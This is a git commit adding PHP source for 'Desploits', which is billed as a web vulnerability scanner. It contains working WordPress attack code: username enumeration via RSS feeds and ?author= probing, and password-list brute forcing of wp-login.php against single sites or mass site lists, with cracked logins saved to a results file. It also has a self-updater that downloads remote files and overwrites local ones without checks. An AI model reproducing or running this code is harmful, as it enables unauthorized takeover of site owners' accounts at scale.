90554976f048491d05d98d5ad54eaa01e38112e6
Eka Syahwan <ekasyahwan.dev@gmail.com>
2016-10-21 23:06:52 +0700

    versi dev

---
+++ package/desploits.class.php
@@ -0,0 +1,129 @@
+<?php
+error_reporting(0);
+require_once("package/modules.class.php");
+require_once("package/fadmin.class.php");
+require_once("package/wordpress.class.php");
+require_once("package/md5.class.php");
+require_once("package/engine.class.php");
+class Desploit extends Modules
+{
+	function Config(){
+		$Desploit = array('ver' => '');
+		return $Desploit;
+	}
+	function requiredDes(){
+		$desploits 	= new Modules;
+		if(!curl_version()[version] ){
+		 	$desploits->msg("[required] PHP CLI , apt-get install curl\r\n");
+		}
+		$folder = array('db','package','result','temp');
+		foreach ($folder as $key => $genDRI) {
+			mkdir($genDRI);
+		}
+	}
+	function ConfigWP(){
+		$Desploit = array(
+			'grabuser' => '50'
+		);
+		return $Desploit;
+	}
+	function Covers(){
+		$v 	= $this->Config()['ver'];                                  
+		echo "     _             _     _ _         		\r\n";
+		echo "   _| |___ ___ ___| |___|_| |_ ___   {$v}	\r\n";
+		echo "  | . | -_|_ -| . | | . | |  _|_ -|  		\r\n";
+		echo "  |___|___|___|  _|_|___|_|_| |___|  		\r\n";
+		echo "              |_|                    		\r\n";
+		echo "  --------------------------------------  \r\n";
+		echo "  Web Application Vulnerability Scanners  \r\n";
+		echo "  --------------------------------------  \r\n\n";
+    }
+    function help(){
+        $label = array(
+        	'1' => 'Set Url : --url=<url> / --url-list=<list file> <tools> <argv> <argv> ...',
+        	'2' => "Tools List    : \r\n"
+        );
+    	$tools = array(
+    		'Fadmin' 	=> '<set url/list> --fadmin=[asp|php|brf|cfm|cgi|js]',
+    		'wpbrute'	=> '<set url/list> --wpbrute --setuser={admin|auto} --passlist={optional}',
+    		'md5dencry' => '--md5={key/hash} / --md5={hash.txt}',
+    		'scraper' 	=> '--scraper --dork={dork/file.txt} --patch / --no-patch'
+    	);
+    	foreach ($label as $key => $value) {
+    		echo $value."\r\n";
+    	}
+    	foreach ($tools as $key => $value) {
+    		echo "<desploits> ".$value."\r\n";
+    	}
+
+    }
+	function arguments($argv) { 
+		    $_ARG = array(); 
+		    foreach ($argv as $arg) { 
+		      if (ereg('--([^=]+)=(.*)',$arg,$reg)) { 
+		        $_ARG[$reg[1]] = $reg[2]; 
+		      } elseif(ereg('^-([a-zA-Z0-9])',$arg,$reg)) { 
+		            $_ARG[$reg[1]] = 'true'; 
+		      } else { 
+		            $_ARG['input'][]=$arg; 
+		      } 
+		    } 
+	  	return $_ARG; 
+	}
+	function update(){
+		$myVer = $this->Config()[ver];
+		$this->msg("[Update] Pleas wait ... check for updates");
+		$version = json_decode($this->ngecurl("http://ekasyahwan.github.io/version/desploits.json"),true);
+		if($myVer < $version[release][version]){
+			$this->msg("[Update] Old Version  : ".$myVer);
+			$this->msg("[Update] Last Version : ".$version[release][version]." (Release : ".$version[release][date].")");
+			$this->msg("[Update] Get New Version ... pleas wait");
+			sleep(3);
+			foreach ($version[required][dir] as $mdkirs) {
+				if(is_dir($mdkirs)){
+					$this->msg("[Update] [OK] Create directory ".$mdkirs);
+				}else{
+					if(mkdir($mdkirs, 0777)){
+						$this->msg("[Update] [OK] Create directory ".$mdkirs);
+					}else{
+						$this->msg("[Update] [FAIL] Create directory ".$mdkirs);
+					}
+				}
+			}
+			foreach ($version[required][file] as $file) {
+				foreach ($file as $key => $files) {
+					$data = $this->ngecurl($version[repository][files].$version[release][version]."/".$files);
+					if($data != ""){
+						if(unlink($files)){
+							$this->msg("[Update] [OK] Removes Files ".$files);
+						}
+						if( file_put_contents($files , $data) ){
+							$this->msg("[Update] [OK] Create files ".$files);
+							if($files == "desploits.php"){
+								chmod($files,755);
+							}
+						}else{
+							$this->msg("[Update] [FAIL] Create files ".$files);
+						}
+					}else{
+						$this->msg("Pleas Download : http://ekasyahwan.github.io/tools/desploits.php / https://github.com/ekasyahwan/desploits for manual download");
+						exit();
+					}
+				}
+			}
+			$this->msg("\r\n--------- thanks for updates Desploits ---------");
+		}else{
+			$this->msg("no update");
+		}
+	}
+}
+$desploit 	= new Desploit;
+$fadmin 	= new Fadmin;
+$wordpress	= new Wordpress;
+$md5		= new Md5;
+$engine 	= new Engine;
+/** call class package **/
+$desploit->Covers();
+$desploit->requiredDes();
+$command  = $desploit->arguments($argv);
+?>
---
+++ package/wordpress.class.php
@@ -0,0 +1,117 @@
+<?php
+class Wordpress extends Modules
+{
+	#Wordpress brute force
+	function check($url,$username,$password){
+		$ref    = str_replace("wp-login.php", "wp-admin/", $url);
+		$Origin = str_replace("wp-login.php", "", $url);
+		$header = array(
+    		"content-type: application/x-www-form-urlencoded",
+    		"origin: ".$Origin,
+    		"referer: ".$ref
+		);
+		$result = $this->ngecurl($url , "log=".$username."&pwd=".$password , $header);
+		$re = '/\.php\?action=logout/';
+		preg_match_all($re, $result, $matches);
+		if( $matches[0][0] ){
+			return true;
+		}
+		return false;
+	}
+	function detectuser($urls)
+	{	$this->msg("[WPbrute][Grab User] Pleas wait...");
+		$mode = array('?feed=rss2','?rss.xml');
+		foreach ($mode as $key => $modes) {
+			$this->msg("[WPbrute][Grab User] Checking Mode ".$key);
+			$url = $this->ngeChuk($urls.$modes);
+			if( $this->mod_httpcode($url) === 200){
+				$re = '/<dc:creator><![CDATA[]+(.*?)]]><\/dc:creator>/';
+				preg_match_all($re, $this->ngecurl($url) , $matches);
+				$this->msg("[WPbrute][Grab User] w00t ".count(array_unique($matches[1]))." user");
+				foreach ($matches[1] as $key => $userne) {
+					$user[] = $userne;
+				}
+			}
+		}
+		$desploit = new Desploit;
+		$grabuser = $desploit->ConfigWP()['grabuser'];
+		for ($i=0; $i < $grabuser; $i++) { 
+			$result = $this->ngecurl($urls."?author=".$i);
+			$reuser = "/\\/author\\/(.*?)\\//"; 
+	        preg_match($reuser, $result, $matches);
+	        if( $matches[1] ){
+	          	$user[] = $matches[1];
+	        }
+	        $this->msg("[WPbrute][Grab User] $i of $grabuser | w0ot ".count($user)." user");
+		}
+		$user = array_unique($user);
+		$this->msg("[WPbrute][Grab User] remove duplicates user | w0ot : ".count($user)." user");
+		return $user;
+	}
+	function single($url,$setuser,$passwordlist){
+		$url 	= $this->ngeChuk($url);
+		$this->msg("[WPbrute][SET Target] Sites : ".$url);
+
+		if(!file_exists($passwordlist)){
+			$passwordlist = "db/wordpress/password.txt";
+		}
+		switch ($setuser) {
+			case 'auto':
+				$user = $this->detectuser($url);
+			break;
+			default:
+				$user[] = $setuser;
+			break;
+		}
+		$hit = count($user);
+		foreach ($user as $key => $users) {
+			$wordlist = $this->loadFile($passwordlist);
+			$countWL  = count($wordlist);
+			foreach ($wordlist as $key => $pass) {
+				if( $this->check($url."wp-login.php",$users,$pass) ){
+					$this->msg("[WPbrute][".$hit."][".$countWL."][Login] Success -> ".$users." | ".$pass);
+					$this->ngesave("result/wpbrute","[+] ".$url." [".$users."|".$pass."]");
+				}else{
+					$this->msg("[WPbrute][".$hit."][".$countWL."][Login] Failed -> ".$users." | ".$pass);
+				}
+				$countWL = $countWL-1;
+			}
+			$hit = $hit-1;
+		}
+	}
+
+	function mass($list,$setuser,$passwordlist){
+		if(!file_exists($passwordlist)){
+			$passwordlist = "db/wordpress/password.txt";
+		}
+		$files = $this->loadFile($list);
+		$siteshit = count($files);
+		foreach ($files as $key => $sites) {
+			$this->msg("[WPbrute][".$siteshit."] Site : ".$sites);
+			$url 	= $this->ngeChuk($sites);
+			switch ($setuser) {
+				case 'auto':
+					$user = $this->detectuser($url);
+				break;
+				default:
+					$user[] = $setuser;
+				break;
+			}
+			$hit = count($user);
+			foreach ($user as $key => $users) {
+			$wordlist = $this->loadFile($passwordlist);
+			$countWL  = count($wordlist);
+				foreach ($wordlist as $key => $pass) {
+					if( $this->check($url."wp-login.php",$users,$pass) ){
+						$this->msg("[WPbrute][".$hit."][".$countWL."][Login] Success -> ".$users." | ".$pass);
+						$this->ngesave("result/wpbrute","[+] ".$url." [".$users."|".$pass."]");		
+					}else{
+						$this->msg("[WPbrute][".$hit."][".$countWL."][Login] Failed -> ".$users." | ".$pass);
+					}
+				}
+				$hit = $hit-1;
+			}
+			$siteshit = $siteshit-1;echo "\r\n";
+		}
+	}
+}
